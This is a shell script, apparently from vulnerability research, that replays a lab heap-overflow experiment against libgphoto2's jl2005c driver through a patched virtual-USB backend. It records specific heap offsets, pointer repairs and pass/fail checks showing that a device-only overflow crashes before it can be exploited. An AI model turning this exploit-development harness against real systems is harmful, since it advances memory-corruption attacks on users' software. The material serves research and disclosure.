#!/bin/sh
# W195: device-only natural heap overflow cannot survive the first real
# consumer allocation on the W193 clang build. vusb mode s stops the bulk
# reply before clang's spilled priv pointer but leaves the top-chunk size
# zeroed; reply offsets 0x3E30/0x3E38 are simultaneously the top header and
# the only copy of the live priv pointer. Mode n repairs them with a
# gdb-derived full pointer and a constant size, purely as a causal control.
# Author replay of lab-only mechanics: no wire, no command, not rung 5.
set -eu
HERE=$(CDPATH= cd -- "$(dirname "$0")" && pwd)
T=$(CDPATH= cd -- "$HERE/.." && pwd)
BASE=${BASE_WORK:-/tmp/w193-lgp-base}
OUT=${OUT:-$T/evidence/w195-device-only-negative.out}
S=$BASE/src/libgphoto2-2.5.34
B=$BASE/build
P=$B/installdir
PROBE=$BASE/w194-file-consumer-probe
VULN_SHA=0ccb1dac24a837bc58a414942cc74bec47586b826c6c0c91ddcec3adea3d6185
PRIV=${PRIV:-0x555555567600}   # gdb-derived live address; HOST_REPAIR only
TOP=${TOP:-0xe9c1}             # build-specific top chunk size; HOST_REPAIR only

[ -d "$S" ] && [ -x "$PROBE" ] || { echo "missing W193 base; run replay-partial-priv.sh first" >&2; exit 2; }
command -v clang >/dev/null && command -v setarch >/dev/null || { echo "clang and setarch required" >&2; exit 2; }
mkdir -p "$(dirname "$OUT")"
exec >"$OUT" 2>&1

echo "== W195 device-only natural-overflow replay =="
cd "$S"
[ "$(sha256sum camlibs/jl2005c/jl2005c.c | cut -d' ' -f1)" = "$VULN_SHA" ] || { echo "vulnerable source sha mismatch" >&2; exit 2; }
if ! grep -q M2SHELL_W195_PRIV libgphoto2_port/vusb/vusb.c; then
	patch -p1 < "$T/evidence/w195-vusb-natural-repair.patch"
	make -C "$B/libgphoto2_port" -j4 >/dev/null
	make -C "$B/libgphoto2_port" install >/dev/null
fi

COMMON="CAMLIBS=$P/lib/libgphoto2/2.5.34 IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb LD_LIBRARY_PATH=$P/lib"
run() {
	label=$1; shift
	set +e
	# shellcheck disable=SC2086
	timeout 8 env $COMMON "$@" setarch -R "$PROBE" usb:001,001 "$BASE/w195-$label.bin" >"$BASE/w195-$label.out" 2>&1
	rc=$?
	set -e
	echo "=== $label (rc $rc) ==="
	cat "$BASE/w195-$label.out"
}

echo "== device-only: full table write, ptr slot untouched =="
run DEVICE_ONLY M2SHELL_DEBUG= M2SHELL_JL2005_VUSB=s M2SHELL_JL2005_COUNT=1022

echo "== safe count: same mode, no overflow =="
run SAFE M2SHELL_JL2005_VUSB=s M2SHELL_JL2005_COUNT=100

echo "== causal control: host full pointer + constant top size =="
run HOST_REPAIR M2SHELL_JL2005_VUSB=n M2SHELL_JL2005_COUNT=1022 \
	M2SHELL_W195_PRIV="$PRIV" M2SHELL_W195_TOP="$TOP"

echo "== causal control: wrong top size =="
run WRONG_TOP M2SHELL_JL2005_VUSB=n M2SHELL_JL2005_COUNT=1022 \
	M2SHELL_W195_PRIV="$PRIV" M2SHELL_W195_TOP=0

python3 - "$BASE" <<'PY'
import os, sys
b = sys.argv[1]
def text(n):
    try:
        return open(os.path.join(b, "w195-" + n + ".out"), encoding="utf-8", errors="replace").read()
    except OSError:
        return ""
checks = [
    ("device-only init survives",
     "AFTER_INIT rc=0" in text("DEVICE_ONLY")),
    ("device-only first consumer allocation aborts",
     "malloc(): corrupted top size" in text("DEVICE_ONLY")),
    ("device-only no consumer listing",
     "LIST rc=0" not in text("DEVICE_ONLY")),
    ("safe count lists camera entries",
     "LIST rc=0 count=100" in text("SAFE")),
    ("safe count no heap abort",
     "malloc" not in text("SAFE")),
    ("host pointer+top-size repair reaches consumer",
     "LIST rc=0 count=1022" in text("HOST_REPAIR")),
    ("host repair no heap abort",
     "malloc" not in text("HOST_REPAIR")),
    ("wrong top size aborts in sysmalloc",
     "sysmalloc" in text("WRONG_TOP")),
    ("wrong top size no consumer listing",
     "LIST rc=0" not in text("WRONG_TOP")),
]
for name, ok in checks:
    print(("PASS " if ok else "FAIL ") + name)
p = sum(ok for _, ok in checks)
print("RESULT: %d PASS / %d FAIL" % (p, len(checks) - p))
raise SystemExit(0 if p == len(checks) else 1)
PY
# End W195 replay.
